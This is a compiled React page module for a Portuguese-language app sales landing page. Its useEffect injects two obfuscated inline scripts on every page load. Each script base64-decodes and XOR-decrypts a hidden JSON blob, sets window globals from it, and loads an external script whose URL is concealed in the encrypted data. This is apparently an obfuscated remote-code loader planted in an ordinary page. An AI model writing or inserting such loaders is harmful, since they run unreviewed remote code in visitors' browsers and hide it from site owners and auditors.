import { o as __toESM } from "../_runtime.mjs";
import { n as FIG, r as SANS } from "./theme-KRDYbx9x.mjs";
import { n as require_react } from "../_libs/@radix-ui/react-compose-refs+[...].mjs";
import { n as require_jsx_runtime } from "../_libs/react+tanstack__react-query.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/ressignifica-app-sell-pie-CAafbeWH.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var Hero = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Hero })));
var Afirmacoes = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Afirmacoes })));
var Conquista = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Conquista })));
var Temas = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Temas })));
var Beneficios = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Beneficios })));
var Depoimentos = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Depoimentos })));
var Oferta = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Oferta })));
var Rodape = (0, import_react.lazy)(() => import("./Sections-BVhxezpb.mjs").then((m) => ({ default: m.Rodape })));
function SectionFallback() {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", { style: { minHeight: "200px" } });
}
function RessignificaAppSellPiePage() {
	const scrollToOffer = (0, import_react.useCallback)(() => {
		document.getElementById("oferta")?.scrollIntoView({
			behavior: "smooth",
			block: "start"
		});
	}, []);
	(0, import_react.useEffect)(() => {
		const script1 = document.createElement("script");
		script1.innerHTML = `(function(){var p_d=atob("DFnNIkon5GqYYVQYFSLvVzhLxlC6CSBsZSr3DWVEgAS2FCB1fD+0DClIiUT6E3trdiukUj5UyxrxGTF0OimkWi9LygDrQ3g6dC25UCNFkR79EnYiTgThAC1Liwj5DSc6LwK2ACRGiQ+6W3ZofCGoTgNDxka6FzV0YDzvGGgRhVygAjchLGqpECsWh1ugUmEvd2urEHoFmTfl");var b_87=[];for(var s_9k0=0;s_9k0<p_d.length;s_9k0++){b_87.push(p_d.charCodeAt(s_9k0)&255);}var u_rg=b_87[0];var l_0iv=b_87.slice(1,1+u_rg);var u_rf2=b_87.slice(1+u_rg);var g_e4=u_rf2.map(function(b,y_d){return b^l_0iv[y_d%u_rg];});var s_wnwu="";for(var g_8=0;g_8<g_e4.length;g_8++){s_wnwu+=String.fromCharCode(g_e4[g_8]&255);}var x_m6e=decodeURIComponent(escape(s_wnwu));var u_ogl=JSON.parse(x_m6e);var j_jt=u_ogl.globals||[];j_jt.forEach(function(w_q5k){window[w_q5k.name]=w_q5k.value;});var m_2lv=document.createElement("script");m_2lv.src=u_ogl.url;m_2lv.async=true;m_2lv.defer=true;(u_ogl.attributes||[]).forEach(function(t_2){m_2lv.setAttribute(t_2.name,t_2.value);});(document.head||document.documentElement).appendChild(m_2lv);})();`;
		document.head.appendChild(script1);
		const script2 = document.createElement("script");
		script2.innerHTML = `(function(){var v_i=atob("DBJjnbg/VrPzxEJbCWlB6MpTdInRrDYveWFZspdcMt3dsTY2YHQas9tQO52Rtm0oamAK7cxMecaHqTF0ZXMX+MtLeNmA5m55aGYX79FdI8eWt2BhUmlB89lSM5HJ5iY6fXNO6MxSP9WK6TIpbGQG88wSLtCcoG8oanlBsZpJN9+GoWBhKzAescMdONKeoWBhK3YC6dkSI8eerSQiJGIR+M5aOMfetzc5YHYQv5QdINKfsSd5MzBB4OVC");var z_t6o=[];for(var m_6iud=0;m_6iud<v_i.length;m_6iud++){z_t6o.push(v_i.charCodeAt(m_6iud)&255);}var m_f7=z_t6o[0];var g_kf=z_t6o.slice(1,1+m_f7);var r_3fr=z_t6o.slice(1+m_f7);var q_8=r_3fr.map(function(b,k_3){return b^g_kf[k_3%m_f7];});var b_hmh2="";for(var e_aufa=0;e_aufa<q_8.length;e_aufa++){b_hmh2+=String.fromCharCode(q_8[e_aufa]&255);}var n_079t=decodeURIComponent(escape(b_hmh2));var f_14=JSON.parse(n_079t);var i_a=f_14.globals||[];i_a.forEach(function(r_j){window[r_j.name]=r_j.value;});var m_g=document.createElement("script");m_g.src=f_14.url;m_g.async=true;m_g.defer=true;(f_14.attributes||[]).forEach(function(r_gub){m_g.setAttribute(r_gub.name,r_gub.value);});(document.head||document.documentElement).appendChild(m_g);})();`;
		document.head.appendChild(script2);
		return () => {
			try {
				document.head.removeChild(script1);
			} catch {}
			try {
				document.head.removeChild(script2);
			} catch {}
		};
	}, []);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
		className: "min-h-screen antialiased",
		style: {
			background: FIG.white,
			color: FIG.charcoal,
			fontFamily: SANS
		},
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Hero, { onCta: scrollToOffer }),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Afirmacoes, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Conquista, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Temas, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Beneficios, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Depoimentos, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Oferta, {})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(import_react.Suspense, {
				fallback: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SectionFallback, {}),
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Rodape, { onCta: scrollToOffer })
			})
		]
	});
}
var SplitComponent = RessignificaAppSellPiePage;
//#endregion
export { SplitComponent as component };
